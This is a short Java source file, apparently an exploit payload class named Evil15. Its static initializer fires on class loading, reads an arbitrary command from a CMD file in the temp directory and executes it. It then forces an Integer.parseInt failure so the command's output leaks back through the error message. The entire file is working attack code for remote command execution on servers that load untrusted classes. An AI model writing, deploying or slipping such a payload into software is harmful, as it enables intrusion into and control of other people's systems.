import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Evil15 {

    static {
        StringBuilder stringBuilder = new StringBuilder();
        try {
            String tmp = System.getProperty("java.io.tmpdir");
            String cmd = new String(Files.readAllBytes(Paths.get(tmp + File.separator + "CMD")));
            InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        Integer.parseInt(stringBuilder.toString());
    }
}